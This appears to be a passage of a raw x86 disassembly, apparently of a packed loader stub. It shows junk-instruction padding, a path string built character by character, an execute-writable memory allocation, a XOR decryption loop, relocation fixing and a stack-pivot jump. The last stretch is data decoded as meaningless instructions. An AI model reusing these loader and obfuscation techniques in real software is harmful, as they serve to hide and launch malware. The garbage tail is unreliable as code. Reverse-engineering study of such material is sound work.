  401c48:	mov    DWORD PTR [ebp-0x4],0x86de
  401c4f:	mov    DWORD PTR [ebp-0x4],0x86de
  401c56:	mov    DWORD PTR [ebp-0x4],0x86de
  401c5d:	mov    DWORD PTR [ebp-0x4],0x86de
  401c64:	mov    DWORD PTR [ebp-0x4],0x86de
  401c6b:	mov    DWORD PTR [ebp-0x4],0x86de
  401c72:	mov    DWORD PTR [ebp-0x4],0x86de
  401c79:	mov    DWORD PTR [ebp-0x4],0x86de
  401c80:	mov    DWORD PTR [ebp-0x4],0x86de
  401c87:	mov    DWORD PTR [ebp-0x4],0x86de
  401c8e:	mov    DWORD PTR [ebp-0x4],0x86de
  401c95:	mov    DWORD PTR [ebp-0x4],0x86de
  401c9c:	mov    DWORD PTR [ebp-0x4],0x86de
  401ca3:	mov    DWORD PTR [ebp-0x4],0x86de
  401caa:	mov    DWORD PTR [ebp-0x4],0x86de
  401cb1:	mov    DWORD PTR [ebp-0x4],0x86de
  401cb8:	mov    DWORD PTR [ebp-0x4],0x86de
  401cbf:	mov    DWORD PTR [ebp-0x4],0x86de
  401cc6:	mov    DWORD PTR [ebp-0x4],0x86de
  401ccd:	mov    DWORD PTR [ebp-0x4],0x86de
  401cd4:	mov    DWORD PTR [ebp-0x4],0x86de
  401cdb:	mov    DWORD PTR [ebp-0x4],0x86de
  401ce2:	mov    DWORD PTR [ebp-0x4],0x86de
  401ce9:	mov    DWORD PTR [ebp-0x4],0x86de
  401cf0:	mov    DWORD PTR [ebp-0x4],0x86de
  401cf7:	mov    DWORD PTR [ebp-0x4],0x86de
  401cfe:	mov    DWORD PTR [ebp-0x4],0x86de
  401d05:	mov    DWORD PTR [ebp-0x4],0x86de
  401d0c:	mov    DWORD PTR [ebp-0x4],0x86de
  401d13:	mov    DWORD PTR [ebp-0x4],0x86de
  401d1a:	mov    DWORD PTR [ebp-0x4],0x86de
  401d21:	mov    DWORD PTR [ebp-0x4],0x86de
  401d28:	mov    DWORD PTR [ebp-0x4],0x86de
  401d2f:	mov    DWORD PTR [ebp-0x4],0x86de
  401d36:	mov    DWORD PTR [ebp-0x4],0x86de
  401d3d:	mov    DWORD PTR [ebp-0x4],0x86de
  401d44:	mov    DWORD PTR [ebp-0x4],0x86de
  401d4b:	mov    DWORD PTR [ebp-0x4],0x86de
  401d52:	mov    DWORD PTR [ebp-0x4],0x86de
  401d59:	mov    DWORD PTR [ebp-0x4],0x86de
  401d60:	mov    DWORD PTR [ebp-0x4],0x86de
  401d67:	mov    DWORD PTR [ebp-0x4],0x0
  401d6e:	jmp    0x401d79
  401d70:	mov    eax,DWORD PTR [ebp-0x4]
  401d73:	add    eax,0x1
  401d76:	mov    DWORD PTR [ebp-0x4],eax
  401d79:	mov    ecx,DWORD PTR [ebp-0x4]
  401d7c:	cmp    ecx,DWORD PTR ds:0x41a20c
  401d82:	jae    0x401de7
  401d84:	mov    edx,DWORD PTR [ebp-0x4]
  401d87:	push   edx
  401d88:	mov    eax,ds:0x41a210
  401d8d:	push   eax
  401d8e:	call   0x402080
  401d93:	add    esp,0x8
  401d96:	sar    eax,0xc
  401d99:	cmp    eax,0x3
  401d9c:	jne    0x401de5
  401d9e:	mov    ecx,DWORD PTR [ebp-0x4]
  401da1:	push   ecx
  401da2:	mov    edx,DWORD PTR ds:0x41a210
  401da8:	push   edx
  401da9:	call   0x402080
  401dae:	add    esp,0x8
  401db1:	and    eax,0xfff
  401db6:	add    eax,0x907
  401dbb:	mov    DWORD PTR [ebp-0x8],eax
  401dbe:	mov    eax,DWORD PTR [ebp+0x8]
  401dc1:	mov    ecx,DWORD PTR [ebp+0xc]
  401dc4:	add    ecx,DWORD PTR [eax]
  401dc6:	mov    edx,DWORD PTR [ebp-0x8]
  401dc9:	mov    eax,DWORD PTR [ecx+edx*1-0x907]
  401dd0:	add    eax,DWORD PTR [ebp+0x10]
  401dd3:	mov    ecx,DWORD PTR [ebp+0x8]
  401dd6:	mov    edx,DWORD PTR [ebp+0xc]
  401dd9:	add    edx,DWORD PTR [ecx]
  401ddb:	mov    ecx,DWORD PTR [ebp-0x8]
  401dde:	mov    DWORD PTR [edx+ecx*1-0x907],eax
  401de5:	jmp    0x401d70
  401de7:	mov    esp,ebp
  401de9:	pop    ebp
  401dea:	ret    
  401deb:	int3   
  401dec:	int3   
  401ded:	int3   
  401dee:	int3   
  401def:	int3   
  401df0:	push   ebp
  401df1:	mov    ebp,esp
  401df3:	sub    esp,0x214
  401df9:	push   0x104
  401dfe:	lea    eax,[ebp-0x208]
  401e04:	push   eax
  401e05:	call   DWORD PTR ds:0x41a214
  401e0b:	mov    DWORD PTR [ebp-0x210],0x0
  401e15:	jmp    0x401e26
  401e17:	mov    ecx,DWORD PTR [ebp-0x210]
  401e1d:	add    ecx,0x1
  401e20:	mov    DWORD PTR [ebp-0x210],ecx
  401e26:	mov    edx,DWORD PTR [ebp-0x210]
  401e2c:	cmp    edx,DWORD PTR [ebp+0x10]
  401e2f:	jge    0x401f4f
  401e35:	cmp    DWORD PTR [ebp-0x210],0x0
  401e3c:	jne    0x401ef5
  401e42:	mov    DWORD PTR [ebp-0x214],0x41a090
  401e4c:	mov    eax,0x5c
  401e51:	mov    ecx,DWORD PTR [ebp-0x214]
  401e57:	mov    WORD PTR [ecx],ax
  401e5a:	mov    edx,0x73
  401e5f:	mov    eax,DWORD PTR [ebp-0x214]
  401e65:	mov    WORD PTR [eax+0x2],dx
  401e69:	mov    ecx,0x79
  401e6e:	mov    edx,DWORD PTR [ebp-0x214]
  401e74:	mov    WORD PTR [edx+0x4],cx
  401e78:	mov    eax,0x65
  401e7d:	mov    ecx,DWORD PTR [ebp-0x214]
  401e83:	mov    WORD PTR [ecx+0xa],ax
  401e87:	mov    edx,0x6d
  401e8c:	mov    eax,DWORD PTR [ebp-0x214]
  401e92:	mov    WORD PTR [eax+0xc],dx
  401e96:	mov    ecx,0x33
  401e9b:	mov    edx,DWORD PTR [ebp-0x214]
  401ea1:	mov    WORD PTR [edx+0xe],cx
  401ea5:	mov    eax,0x32
  401eaa:	mov    ecx,DWORD PTR [ebp-0x214]
  401eb0:	mov    WORD PTR [ecx+0x10],ax
  401eb4:	mov    edx,0x5c
  401eb9:	mov    eax,DWORD PTR [ebp-0x214]
  401ebf:	mov    WORD PTR [eax+0x12],dx
  401ec3:	mov    ecx,0x73
  401ec8:	mov    edx,DWORD PTR [ebp-0x214]
  401ece:	mov    WORD PTR [edx+0x16],cx
  401ed2:	mov    eax,0x65
  401ed7:	mov    ecx,DWORD PTR [ebp-0x214]
  401edd:	mov    WORD PTR [ecx+0x24],ax
  401ee1:	mov    edx,DWORD PTR [ebp-0x214]
  401ee7:	push   edx
  401ee8:	lea    eax,[ebp-0x208]
  401eee:	push   eax
  401eef:	call   DWORD PTR ds:0x41a218
  401ef5:	mov    ecx,DWORD PTR [ebp+0x8]
  401ef8:	add    ecx,DWORD PTR [ebp-0x210]
  401efe:	mov    edx,DWORD PTR [ebp+0xc]
  401f01:	add    edx,DWORD PTR [ebp-0x210]
  401f07:	mov    al,BYTE PTR [edx]
  401f09:	mov    BYTE PTR [ecx],al
  401f0b:	cmp    DWORD PTR [ebp-0x210],0x0
  401f12:	jne    0x401f4a
  401f14:	push   0x0
  401f16:	push   0x80
  401f1b:	push   0x3
  401f1d:	push   0x0
  401f1f:	push   0x3
  401f21:	push   0x1
  401f23:	lea    ecx,[ebp-0x208]
  401f29:	push   ecx
  401f2a:	call   DWORD PTR ds:0x41a21c
  401f30:	mov    DWORD PTR [ebp-0x20c],eax
  401f36:	cmp    DWORD PTR [ebp-0x20c],0xffffffff
  401f3d:	je     0x401f48
  401f3f:	cmp    DWORD PTR [ebp-0x20c],0x0
  401f46:	jne    0x401f4a
  401f48:	jmp    0x401f7b
  401f4a:	jmp    0x401e17
  401f4f:	mov    edx,DWORD PTR [ebp+0x8]
  401f52:	cmp    edx,DWORD PTR ds:0x41a204
  401f58:	jne    0x401f7b
  401f5a:	mov    eax,ds:0x41a200
  401f5f:	sub    eax,0x400000
  401f64:	push   eax
  401f65:	mov    ecx,DWORD PTR ds:0x41a200
  401f6b:	push   ecx
  401f6c:	mov    edx,DWORD PTR ds:0x41a1f0
  401f72:	push   edx
  401f73:	call   0x402240
  401f78:	add    esp,0xc
  401f7b:	mov    esp,ebp
  401f7d:	pop    ebp
  401f7e:	ret    
  401f7f:	int3   
  401f80:	push   ebp
  401f81:	mov    ebp,esp
  401f83:	mov    eax,DWORD PTR [ebp+0x8]
  401f86:	mov    ecx,DWORD PTR [ebp+0x8]
  401f89:	add    ecx,DWORD PTR [eax+0x4]
  401f8c:	mov    eax,ecx
  401f8e:	pop    ebp
  401f8f:	ret    
  401f90:	push   ebp
  401f91:	mov    ebp,esp
  401f93:	sub    esp,0x220
  401f99:	mov    DWORD PTR [ebp-0x8],0x307c
  401fa0:	mov    DWORD PTR [ebp-0x220],0x3000
  401faa:	mov    DWORD PTR [ebp-0x4],0x40
  401fb1:	mov    DWORD PTR [ebp-0x214],0x0
  401fbb:	mov    DWORD PTR [ebp-0x218],0x0
  401fc5:	mov    DWORD PTR [ebp-0x8],0x307c
  401fcc:	mov    DWORD PTR [ebp-0x8],0x307c
  401fd3:	mov    DWORD PTR [ebp-0x8],0x307c
  401fda:	mov    eax,ds:0x41a130
  401fdf:	mov    ds:0x41a218,eax
  401fe4:	mov    DWORD PTR [ebp-0x8],0x307c
  401feb:	mov    ecx,DWORD PTR ds:0x41a134
  401ff1:	mov    DWORD PTR ds:0x41a21c,ecx
  401ff7:	mov    edx,DWORD PTR ds:0x41a138
  401ffd:	mov    DWORD PTR ds:0x41a214,edx
  402003:	push   0x104
  402008:	lea    eax,[ebp-0x210]
  40200e:	push   eax
  40200f:	call   DWORD PTR ds:0x41a214
  402015:	mov    ecx,DWORD PTR [ebp-0x4]
  402018:	push   ecx
  402019:	mov    edx,DWORD PTR [ebp-0x220]
  40201f:	push   edx
  402020:	mov    eax,DWORD PTR [ebp+0x8]
  402023:	push   eax
  402024:	mov    ecx,DWORD PTR [ebp-0x214]
  40202a:	push   ecx
  40202b:	push   0xffffffff
  40202d:	call   DWORD PTR ds:0x41a13c
  402033:	mov    esp,ebp
  402035:	pop    ebp
  402036:	ret    
  402037:	int3   
  402038:	int3   
  402039:	int3   
  40203a:	int3   
  40203b:	int3   
  40203c:	int3   
  40203d:	int3   
  40203e:	int3   
  40203f:	int3   
  402040:	push   ebp
  402041:	mov    ebp,esp
  402043:	push   ecx
  402044:	mov    DWORD PTR [ebp-0x4],0x5e3d
  40204b:	mov    ecx,ecx
  40204d:	mov    ecx,ecx
  40204f:	mov    ecx,ecx
  402051:	mov    ecx,ecx
  402053:	mov    edx,edx
  402055:	mov    edx,edx
  402057:	mov    edx,edx
  402059:	mov    ecx,ecx
  40205b:	mov    esp,DWORD PTR ds:0x41a1f8
  402061:	mov    ecx,ecx
  402063:	mov    edx,edx
  402065:	mov    ecx,ecx
  402067:	mov    edx,edx
  402069:	add    esp,0x4
  40206c:	mov    edx,edx
  40206e:	mov    ecx,ecx
  402070:	mov    edx,edx
  402072:	mov    edx,edx
  402074:	jmp    DWORD PTR ds:0x41a208
  40207a:	mov    esp,ebp
  40207c:	pop    ebp
  40207d:	ret    
  40207e:	int3   
  40207f:	int3   
  402080:	push   ebp
  402081:	mov    ebp,esp
  402083:	sub    esp,0x18
  402086:	mov    eax,DWORD PTR [ebp+0x8]
  402089:	mov    DWORD PTR [ebp-0x8],eax
  40208c:	mov    ecx,DWORD PTR [ebp+0xc]
  40208f:	mov    DWORD PTR [ebp-0x4],ecx
  402092:	mov    DWORD PTR [ebp-0x10],0x19c
  402099:	mov    edx,DWORD PTR [ebp-0x8]
  40209c:	mov    DWORD PTR ds:0x41a220,edx
  4020a2:	mov    eax,DWORD PTR [ebp-0x4]
  4020a5:	mov    ds:0x41a224,eax
  4020aa:	mov    ecx,DWORD PTR ds:0x41a220
  4020b0:	mov    DWORD PTR [ebp-0x14],ecx
  4020b3:	mov    edx,DWORD PTR ds:0x41a224
  4020b9:	mov    DWORD PTR [ebp-0xc],edx
  4020bc:	mov    eax,DWORD PTR [ebp-0xc]
  4020bf:	mov    ecx,DWORD PTR [ebp-0x14]
  4020c2:	lea    edx,[ecx+eax*2]
  4020c5:	mov    DWORD PTR [ebp-0x18],edx
  4020c8:	mov    eax,DWORD PTR [ebp-0x18]
  4020cb:	mov    DWORD PTR [ebp-0x14],eax
  4020ce:	mov    ecx,DWORD PTR [ebp-0x14]
  4020d1:	movzx  edx,WORD PTR [ecx]
  4020d4:	mov    DWORD PTR [ebp-0xc],edx
  4020d7:	mov    eax,DWORD PTR [ebp-0xc]
  4020da:	mov    esp,ebp
  4020dc:	pop    ebp
  4020dd:	ret    
  4020de:	int3   
  4020df:	int3   
  4020e0:	push   ebp
  4020e1:	mov    ebp,esp
  4020e3:	sub    esp,0xc
  4020e6:	mov    eax,DWORD PTR [ebp+0x8]
  4020e9:	mov    DWORD PTR [ebp-0x8],eax
  4020ec:	mov    ecx,DWORD PTR [ebp+0xc]
  4020ef:	mov    DWORD PTR [ebp-0xc],ecx
  4020f2:	mov    DWORD PTR [ebp-0x4],0x22b
  4020f9:	mov    edx,DWORD PTR [ebp-0x8]
  4020fc:	cmp    edx,DWORD PTR [ebp-0xc]
  4020ff:	jae    0x40210f
  402101:	mov    DWORD PTR [ebp-0x4],0x22b
  402108:	mov    eax,DWORD PTR [ebp-0x8]
  40210b:	jmp    0x402119
  40210d:	jmp    0x402119
  40210f:	mov    DWORD PTR [ebp-0x4],0x22b
  402116:	mov    eax,DWORD PTR [ebp-0xc]
  402119:	mov    esp,ebp
  40211b:	pop    ebp
  40211c:	ret    
  40211d:	int3   
  40211e:	int3   
  40211f:	int3   
  402120:	push   ebp
  402121:	mov    ebp,esp
  402123:	cmp    DWORD PTR [ebp+0x8],0x1
  402127:	jne    0x402131
  402129:	mov    eax,ds:0x41a228
  40212e:	mov    DWORD PTR [ebp+0x8],eax
  402131:	mov    ecx,DWORD PTR [ebp+0x10]
  402134:	push   ecx
  402135:	mov    edx,DWORD PTR [ebp+0xc]
  402138:	push   edx
  402139:	mov    eax,DWORD PTR [ebp+0x8]
  40213c:	push   eax
  40213d:	call   0x401470
  402142:	add    esp,0xc
  402145:	mov    ecx,DWORD PTR [ebp+0x8]
  402148:	push   ecx
  402149:	call   0x401f80
  40214e:	add    esp,0x4
  402151:	mov    DWORD PTR [ebp+0x8],eax
  402154:	mov    eax,DWORD PTR [ebp+0x8]
  402157:	pop    ebp
  402158:	ret    
  402159:	int3   
  40215a:	int3   
  40215b:	int3   
  40215c:	int3   
  40215d:	int3   
  40215e:	int3   
  40215f:	int3   
  402160:	push   ebp
  402161:	mov    ebp,esp
  402163:	sub    esp,0x228
  402169:	mov    DWORD PTR [ebp-0x218],0x0
  402173:	mov    DWORD PTR [ebp-0x214],0x41a0bc
  40217d:	mov    DWORD PTR [ebp-0x4],0x22b
  402184:	mov    DWORD PTR [ebp-0x4],0x22b
  40218b:	mov    DWORD PTR [ebp-0x220],0x0
  402195:	jmp    0x4021a6
  402197:	mov    eax,DWORD PTR [ebp-0x220]
  40219d:	add    eax,0x4
  4021a0:	mov    DWORD PTR [ebp-0x220],eax
  4021a6:	mov    ecx,DWORD PTR [ebp-0x220]
  4021ac:	cmp    ecx,DWORD PTR [ebp+0xc]
  4021af:	jae    0x402236
  4021b5:	mov    DWORD PTR [ebp-0x4],0x22b
  4021bc:	mov    edx,DWORD PTR [ebp-0x220]
  4021c2:	add    edx,0x931
  4021c8:	mov    DWORD PTR ds:0x41a22c,edx
  4021ce:	mov    eax,DWORD PTR [ebp+0x8]
  4021d1:	add    eax,DWORD PTR [ebp-0x220]
  4021d7:	mov    DWORD PTR [ebp-0x228],eax
  4021dd:	mov    DWORD PTR [ebp-0x4],0x22b
  4021e4:	mov    ecx,DWORD PTR [ebp-0x228]
  4021ea:	mov    edx,DWORD PTR [ecx]
  4021ec:	add    edx,DWORD PTR [ebp-0x220]
  4021f2:	mov    eax,DWORD PTR [ebp-0x228]
  4021f8:	mov    DWORD PTR [eax],edx
  4021fa:	mov    ecx,DWORD PTR [ebp-0x228]
  402200:	mov    DWORD PTR [ebp-0x224],ecx
  402206:	mov    edx,DWORD PTR ds:0x41a22c
  40220c:	mov    DWORD PTR [ebp-0x4],edx
  40220f:	mov    eax,DWORD PTR [ebp-0x224]
  402215:	mov    ecx,DWORD PTR [eax]
  402217:	mov    DWORD PTR [ebp-0x4],ecx
  40221a:	mov    edx,DWORD PTR [ebp-0x4]
  40221d:	xor    edx,DWORD PTR ds:0x41a22c
  402223:	mov    DWORD PTR [ebp-0x4],edx
  402226:	mov    eax,DWORD PTR [ebp-0x224]
  40222c:	mov    ecx,DWORD PTR [ebp-0x4]
  40222f:	mov    DWORD PTR [eax],ecx
  402231:	jmp    0x402197
  402236:	mov    esp,ebp
  402238:	pop    ebp
  402239:	ret    
  40223a:	int3   
  40223b:	int3   
  40223c:	int3   
  40223d:	int3   
  40223e:	int3   
  40223f:	int3   
  402240:	push   ebp
  402241:	mov    ebp,esp
  402243:	sub    esp,0x8
  402246:	mov    eax,DWORD PTR [ebp+0x8]
  402249:	cmp    DWORD PTR [eax+0x4],0x0
  40224d:	je     0x40228b
  40224f:	mov    ecx,DWORD PTR [ebp+0x8]
  402252:	add    ecx,0x8
  402255:	mov    DWORD PTR ds:0x41a210,ecx
  40225b:	mov    edx,DWORD PTR [ebp+0x8]
  40225e:	mov    eax,DWORD PTR [edx+0x4]
  402261:	mov    ds:0x41a20c,eax
  402266:	call   0x4013d0
  40226b:	mov    ecx,DWORD PTR [ebp+0x8]
  40226e:	mov    DWORD PTR ds:0x41a228,ecx
  402274:	mov    edx,DWORD PTR [ebp+0x10]
  402277:	push   edx
  402278:	mov    eax,DWORD PTR [ebp+0xc]
  40227b:	push   eax
  40227c:	push   0x1
  40227e:	call   0x402120
  402283:	add    esp,0xc
  402286:	mov    DWORD PTR [ebp+0x8],eax
  402289:	jmp    0x402246
  40228b:	mov    esp,ebp
  40228d:	pop    ebp
  40228e:	ret    
  40228f:	int3   
  402290:	add    BYTE PTR [edx],al
  402292:	add    BYTE PTR [eax],al
  402294:	xor    DWORD PTR [ecx],ecx
  402296:	add    BYTE PTR [eax],al
  402298:	sub    DWORD PTR [ecx],ecx
  40229a:	add    BYTE PTR [eax],al
  40229c:	lods   eax,DWORD PTR ds:[esi]
  40229d:	cmp    edx,DWORD PTR [eax-0x67c462ce]
  4022a3:	xor    cl,ch
  4022a5:	cmp    esp,DWORD PTR [eax-0x57c432ce]
  4022ab:	xor    dh,BYTE PTR [ecx]
  4022ad:	imul   eax,DWORD PTR [ecx],0x94500
  4022b3:	add    BYTE PTR [edx+0x34],dl
  4022b6:	mov    edi,DWORD PTR ds:0x3d9a34a1
  4022bc:	sahf   
  4022bd:	xor    al,0xa8
  4022bf:	cmp    eax,0x3dd334c7
  4022c4:	(bad)  
  4022c5:	xor    al,0xe8
  4022c7:	cmp    eax,0x3e2d372d
  4022cc:	jmp    0xdd36:0xf83e5136
  4022d3:	ds push ebp
  4022d5:	add    BYTE PTR ss:[eax],al
  4022d8:	xor    DWORD PTR [ecx+0x1],edi
  4022db:	add    BYTE PTR [ecx+0x9],bl
  4022de:	add    BYTE PTR [eax],al
  4022e0:	outs   dx,BYTE PTR ds:[esi]
  4022e1:	cmp    ebp,ecx
  4022e3:	xor    BYTE PTR [ecx+edi*1],al
  4022e6:	add    al,0x31
  4022e8:	xor    al,0x38
  4022ea:	daa    
  4022eb:	xor    edi,ebx
  4022ed:	aaa    
  4022ee:	ret    
  4022ef:	xor    edx,edi
  4022f1:	aaa    
  4022f2:	jmp    0xff784128
  4022f7:	xor    DWORD PTR [eax],eax
  4022f9:	xor    eax,0x5732123b
  4022fe:	cmp    esi,DWORD PTR [ecx]
  402300:	xor    bh,BYTE PTR [eax]
  402302:	cmp    edi,DWORD PTR [edi]
  402304:	xor    dh,BYTE PTR [ebx+edi*1+0x58]
  402308:	xor    dh,al
  40230a:	cmp    al,bh
  40230c:	xor    dh,BYTE PTR [edi-0x4bcc74c7]
  402312:	cmp    DWORD PTR [esi-0x32c67ecd],esp
  402318:	xor    ecx,ebp
  40231a:	cmp    edx,ebp
  40231c:	xor    esi,DWORD PTR [ebx]
  40231e:	cmp    eax,0x3d673421
  402323:	push   edi
  402324:	xor    al,0xd
  402326:	cmp    eax,0x3d283463
  40232b:	xor    BYTE PTR [ecx+ebp*4],0x3c
  40232f:	xchg   ecx,eax
  402330:	xor    al,0xbe
  402332:	cmp    al,0x9e
  402334:	xor    al,0xdc
  402336:	cmp    al,0xbd
  402338:	xor    al,0x73
  40233a:	cmp    al,0xd4
  40233c:	xor    al,0x5c
  40233e:	cmp    al,0xe7
  402340:	xor    al,0x7f
  402342:	cmp    al,0x2
  402344:	xor    eax,0x35483c41
  402349:	idiv   DWORD PTR [ebx]
  40234b:	push   esp
  40234c:	xor    eax,0x356a3bd4
  402351:	mov    bl,0x3b
  402353:	mov    esi,0xd53b7935
  402358:	xor    eax,0x35eb3b50
  40235d:	add    BYTE PTR [ebp+0x3b],al
  402360:	(bad)  
  402361:	xor    eax,0x360e3f28
  402366:	inc    ebp
  402367:	cmp    ebx,DWORD PTR ds:0x343b5636
  40236d:	ss pop ebx
  40236f:	cmp    edi,DWORD PTR [edi]
  402371:	ss ins BYTE PTR es:[edi],dx
  402373:	cmp    ecx,DWORD PTR [ecx+0x36]
  402376:	jg     0x4023b3
  402378:	push   esp
  402379:	ss xchg ebx,eax
  40237b:	cmp    ebp,DWORD PTR [eax+0x36]
  40237e:	mov    WORD PTR [ebx],?
  402380:	jb     0x4023b8
  402382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402383:	cmp    ebx,DWORD PTR [edx-0x33c408ca]
  402389:	add    edi,DWORD PTR ss:[esp+ebx*8]
  40238d:	ss aaa 
  40238f:	cmp    al,0x2b
  402391:	aaa    
  402392:	sbb    DWORD PTR [esp+ecx*2],edi
  402395:	aaa    
  402396:	addr16 cmp al,0x63
  402399:	aaa    
  40239a:	pop    eax
  40239b:	cmp    al,0x71
  40239d:	aaa    
  40239e:	cmp    BYTE PTR [esp+eax*4],bh
  4023a1:	aaa    
  4023a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023a3:	cmp    al,0x9d
  4023a5:	aaa    
  4023a6:	sar    DWORD PTR [ecx+esi*4],cl
  4023a9:	aaa    
  4023aa:	ins    BYTE PTR es:[edi],dx
  4023ab:	cmp    al,0xce
  4023ad:	aaa    
  4023ae:	xchg   DWORD PTR [eiz*8+0x93137],edi
  4023b5:	add    BYTE PTR [ecx],dh
  4023b7:	or     DWORD PTR [eax],eax
  4023b9:	add    BYTE PTR [ecx],dh
  4023bb:	or     DWORD PTR [eax],eax
  4023bd:	add    BYTE PTR [ecx],dh
  4023bf:	or     DWORD PTR [eax],eax
  4023c1:	add    BYTE PTR [eax],al
  4023c3:	xor    DWORD PTR [ecx],ecx
  4023c5:	add    BYTE PTR [eax],al
  4023c7:	xor    DWORD PTR [ecx],ecx
  4023c9:	add    BYTE PTR [eax],al
  4023cb:	xor    DWORD PTR [ecx],ecx
  4023cd:	add    BYTE PTR [eax],al
  4023cf:	xor    DWORD PTR [ecx],ecx
  4023d1:	add    BYTE PTR [eax],al
  4023d3:	xor    DWORD PTR [ecx],ecx
  4023d5:	add    BYTE PTR [eax],al
  4023d7:	xor    DWORD PTR [ecx],ecx
  4023d9:	add    BYTE PTR [eax],al
  4023db:	xor    DWORD PTR [ecx],ecx
  4023dd:	add    BYTE PTR [eax],al
  4023df:	xor    DWORD PTR [ecx],ecx
  4023e1:	add    BYTE PTR [eax],al
  4023e3:	xor    DWORD PTR [ecx],ecx
  4023e5:	add    BYTE PTR [eax],al
  4023e7:	xor    DWORD PTR [ecx],ecx
  4023e9:	add    BYTE PTR [eax],al
  4023eb:	xor    DWORD PTR [ecx],ecx
  4023ed:	add    BYTE PTR [eax],al
  4023ef:	xor    DWORD PTR [ecx],ecx
  4023f1:	add    BYTE PTR [eax],al
  4023f3:	xor    DWORD PTR [ecx],ecx
  4023f5:	add    BYTE PTR [eax],al
  4023f7:	xor    DWORD PTR [ecx],ecx
  4023f9:	add    BYTE PTR [eax],al
  4023fb:	xor    DWORD PTR [ecx],ecx
  4023fd:	add    BYTE PTR [eax],al
  4023ff:	xor    DWORD PTR [ecx],ecx
  402401:	add    BYTE PTR [eax],al
  402403:	xor    DWORD PTR [ecx],ecx
  402405:	add    BYTE PTR [eax],al
  402407:	xor    DWORD PTR [ecx],ecx
  402409:	add    BYTE PTR [eax],al
  40240b:	xor    DWORD PTR [ecx],ecx
  40240d:	add    BYTE PTR [eax],al
  40240f:	xor    DWORD PTR [ecx],ecx
  402411:	add    BYTE PTR [eax],al
  402413:	xor    DWORD PTR [ecx],ecx
  402415:	add    BYTE PTR [eax],al
  402417:	xor    DWORD PTR [ecx],ecx
  402419:	add    BYTE PTR [eax],al
  40241b:	xor    DWORD PTR [ecx],ecx
  40241d:	add    BYTE PTR [eax],al
  40241f:	xor    DWORD PTR [ecx],ecx
  402421:	add    BYTE PTR [eax],al
  402423:	xor    DWORD PTR [ecx],ecx
  402425:	add    BYTE PTR [eax],al
  402427:	add    BYTE PTR [ecx],dh
  402429:	or     DWORD PTR [eax],eax
  40242b:	add    BYTE PTR [ecx],dh
  40242d:	or     DWORD PTR [eax],eax
  40242f:	add    BYTE PTR [ecx],dh
  402431:	or     DWORD PTR [eax],eax
  402433:	add    BYTE PTR [ecx],dh
  402435:	or     DWORD PTR [eax],eax
  402437:	add    BYTE PTR [ecx],dh
  402439:	or     DWORD PTR [eax],eax
  40243b:	add    BYTE PTR [ecx],dh
  40243d:	or     DWORD PTR [eax],eax
  40243f:	add    BYTE PTR [ecx],dh
  402441:	or     DWORD PTR [eax],eax
  402443:	add    BYTE PTR [ecx],dh
  402445:	or     DWORD PTR [eax],eax
  402447:	add    BYTE PTR [ecx],dh
  402449:	or     DWORD PTR [eax],eax
  40244b:	add    BYTE PTR [ecx],dh
  40244d:	or     DWORD PTR [eax],eax
  40244f:	add    BYTE PTR [ecx],dh
  402451:	or     DWORD PTR [eax],eax
  402453:	add    BYTE PTR [ecx],dh
  402455:	or     DWORD PTR [eax],eax
  402457:	add    BYTE PTR [ecx],dh
  402459:	or     DWORD PTR [eax],eax
  40245b:	add    BYTE PTR [ecx],dh
  40245d:	or     DWORD PTR [eax],eax
  40245f:	add    BYTE PTR [ecx],dh
  402461:	or     DWORD PTR [eax],eax
  402463:	add    BYTE PTR [ecx],dh
  402465:	or     DWORD PTR [eax],eax
  402467:	add    BYTE PTR [ecx],dh
  402469:	or     DWORD PTR [eax],eax
  40246b:	add    BYTE PTR [ecx],dh
  40246d:	or     DWORD PTR [eax],eax
  40246f:	add    BYTE PTR [ecx],dh
  402471:	or     DWORD PTR [eax],eax
  402473:	add    BYTE PTR [ecx],dh
  402475:	or     DWORD PTR [eax],eax
  402477:	add    BYTE PTR [ecx],dh
  402479:	or     DWORD PTR [eax],eax
  40247b:	add    BYTE PTR [ecx],dh
  40247d:	or     DWORD PTR [eax],eax
  40247f:	add    BYTE PTR [ecx],dh
  402481:	or     DWORD PTR [eax],eax
  402483:	add    BYTE PTR [ecx],dh
  402485:	or     DWORD PTR [eax],eax
  402487:	add    BYTE PTR [ecx],dh
  402489:	or     DWORD PTR [eax],eax
  40248b:	add    BYTE PTR [eax],al
  40248d:	xor    DWORD PTR [ecx],ecx
  40248f:	add    BYTE PTR [eax],al
  402491:	xor    DWORD PTR [ecx],ecx
  402493:	add    BYTE PTR [eax],al
  402495:	xor    DWORD PTR [ecx],ecx
  402497:	add    BYTE PTR [eax],al
  402499:	add    BYTE PTR [edi+0x1],dh
  40249c:	add    BYTE PTR [ecx],dh
  40249e:	jo     0x4024e1
  4024a0:	add    BYTE PTR [esi+0x6c],ch
  4024a3:	je     0x4024f5
  4024a5:	inc    ebx
  4024a6:	data16 arpl WORD PTR [ecx+0x4d],ax
  4024aa:	ins    DWORD PTR es:[edi],dx
  4024ab:	jb     0x402512
  4024ad:	and    bh,BYTE PTR [edx+0x0]
  4024b0:	add    ch,dh
  4024b2:	gs popa 
  4024b4:	fs in  eax,dx
  4024b6:	pop    edi
  4024b7:	bound  esi,QWORD PTR [edx+0x10]
  4024ba:	jnp    0x402535
  4024bc:	inc    ebp
  4024bd:	or     DWORD PTR [eax+0x0],ecx
  4024c0:	add    ch,dh
  4024c2:	gs popa 
  4024c4:	fs in  eax,dx
  4024c6:	pop    edi
  4024c7:	bound  esi,QWORD PTR [edx+0x10]
  4024ca:	jnp    0x402545
  4024cc:	inc    ebp
  4024cd:	jmp    0xee40252f
  4024d2:	imul   esi,DWORD PTR [ebp+ecx*2-0x32],0x6c
  4024d7:	jne    0x402545
  4024d9:	int3   
  4024da:	inc    eax
  4024db:	popa   
  4024dc:	outs   dx,BYTE PTR ds:[esi]
  4024dd:	aad    0x64
  4024df:	gs inc ecx
  4024e1:	xor    DWORD PTR [ecx],ecx
  4024e3:	add    BYTE PTR [eax],al
  4024e5:	bnd jp 0x40254d
  4024e8:	popa   
  4024e9:	mov    ebp,0x9d69466b
  4024ee:	ins    BYTE PTR es:[edi],dx
  4024ef:	inc    ecx
  4024f0:	add    BYTE PTR [ebp-0x6d8d8b86],dl
  4024f6:	push   0x9314174
  4024fb:	add    BYTE PTR [eax],al
  4024fd:	jbe    0x40256b
  4024ff:	je     0x402558
  402501:	add    BYTE PTR [eax-0x79909b99],bl
  402507:	jp     0x40254d
  402509:	imul   eax,DWORD PTR [ebx+0x5e74636c],0x3141797b
